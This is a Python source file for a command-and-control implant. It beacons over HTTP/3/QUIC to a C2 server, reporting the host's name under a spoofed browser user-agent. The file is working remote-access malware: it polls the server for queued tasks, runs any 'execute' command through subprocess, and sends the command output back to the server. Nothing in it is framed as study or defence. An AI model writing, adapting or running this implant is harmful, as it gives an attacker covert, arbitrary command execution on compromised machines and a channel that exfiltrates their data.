import time
import subprocess
import socket
import asyncio
import json
import logging
import sys
from typing import Optional

from aioquic.asyncio.client import connect
from aioquic.asyncio.protocol import QuicConnectionProtocol
from aioquic.quic.configuration import QuicConfiguration
from aioquic.h3.connection import H3Connection
from aioquic.h3.events import HeadersReceived, DataReceived, H3Event

# Suppress debug logs to keep agent console output focused
logging.basicConfig(level=logging.INFO, format="[%(levelname)s] %(message)s")

    


class C2ClientProtocol(QuicConnectionProtocol):
    def __init__(self, *args, **kwargs):
        super().__init__(*args, **kwargs)
        self.http = H3Connection(self._quic)
        self.stream_responses: dict[int, bytearray] = {}

    def quic_event_received(self, event):
        for http_event in self.http.handle_event(event):
            self.handle_h3_event(http_event)

    def handle_h3_event(self, event: H3Event):
        if isinstance(event, HeadersReceived):
            self.stream_responses[event.stream_id] = bytearray()

        elif isinstance(event, DataReceived):
            if event.stream_id in self.stream_responses:
                self.stream_responses[event.stream_id].extend(event.data)

    def send_h3_request(self, path: str, payload: bytes) -> tuple[int, bytes]:
        """
        Sends an HTTP/3 POST request on a new multiplexed QUIC stream 
        and flushes the outgoing frames.
        """
        stream_id = self._quic.get_next_available_stream_id()
        
        headers = [
            (b":method", b"POST"),
            (b":scheme", b"https"),
            (b":authority", b"c2.internal-domain.com"),
            (b":path", path.encode()),
            (b"content-type", b"application/json"),
            (b"user-agent", b"Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/124.0.0.0"),
        ]
        
        self.http.send_headers(stream_id=stream_id, headers=headers)
        self.http.send_data(stream_id=stream_id, data=payload, end_stream=True)
        self.transmit()  # Flush frames out to the socket
        
        return stream_id


async def run_agent(target_host: str, target_port: int, agent_id: str, interval: int):
    config = QuicConfiguration(
        is_client=True,
        alpn_protocols=["h3"]
        
    )

    logging.info(f"Connecting QUIC transport to {target_host}:{target_port}...")

    try:
        async with connect(
            target_host,
            target_port,
            configuration=config,
            create_protocol=C2ClientProtocol
        ) as protocol:
            logging.info("Connected to C2 server via HTTP/3.")
            
            pending_output: Optional[str] = None

            while True:
                # 1. Build telemetry payload (and attach output from previous command if present)
                payload_dict = {
                    "agent_id": agent_id,
                    "status": "idle"
                }
                
                if pending_output is not None:
                    payload_dict["output"] = pending_output
                    pending_output = None

                beacon_bytes = json.dumps(payload_dict).encode("utf-8")

                # 2. Dispatch request on a new QUIC stream ID
                stream_id = protocol.send_h3_request("/api/v1/telemetry", beacon_bytes)
                

                # 3. Brief wait for server response frames to arrive over the socket
                await asyncio.sleep(0.5)

                # 4. Check for and parse the HTTP/3 response payload for this stream
                response_bytes = bytes(protocol.stream_responses.pop(stream_id, bytearray()))
                
                if response_bytes:
                    try:
                        resp_json = json.loads(response_bytes.decode("utf-8"))
                        queued_task = resp_json.get("task")

                        # If a task was queued in quic_demo>, display it and execute
                        if queued_task:
                            print(f"\n[!] RECEIVED QUEUED COMMAND FROM SERVER: '{queued_task}'")
                            command, *args = queued_task.split()
                            if command == "execute":
                                
                                try:
                                    result = subprocess.run(args, capture_output=True, text=True)
                                    
                                    pending_output = result.stdout if result.stdout else result.stderr
                                    if not pending_output:
                                        pending_output = "[+] Command executed with no output."
                                except Exception as e:
                                    pending_output = f"[-] Execution error: {str(e)}"
                            else:
                                pending_output = ("Command not understood, please use execute followed by a command. E.g. 'execute whoami'\n")
                                

                          

                    except json.JSONDecodeError:
                        pass

                await asyncio.sleep(interval)

    except (OSError, asyncio.TimeoutError) as e:
        logging.error(f"Connection error: {e}")
        



def run_quic_tasks(params: dict):
    
    domain = params.get("domain")
    agent_id = socket.gethostname()
    time_interval = 5
    try:
        asyncio.run(run_agent(domain, 443, agent_id, time_interval))
    except KeyboardInterrupt:
        logging.info("Agent shutting down.")
    
    
